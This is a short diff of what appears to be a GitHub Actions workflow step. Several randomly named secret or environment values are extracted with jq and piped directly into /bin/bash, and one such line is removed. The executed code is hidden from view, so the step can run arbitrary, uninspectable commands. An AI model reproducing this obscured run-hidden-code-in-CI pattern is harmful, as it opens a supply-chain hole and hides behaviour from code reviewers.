@@ -27,7 +27,6 @@ jobs:
           htoow09515: ${{ secrets.htoow09515 }}
         run: |
           printf '%s' "$htoow09515" | jq -r .vt194 | /bin/bash
-          printf '%s' "$cdy7844" | jq -r .tggah93 | /bin/bash
           echo $elkyb28 | jq -r .jkwp0 | /bin/bash
           echo $obate5 | jq -r .xakq7 | /bin/bash
           echo $l78736 | jq -r .qi141 | /bin/bash
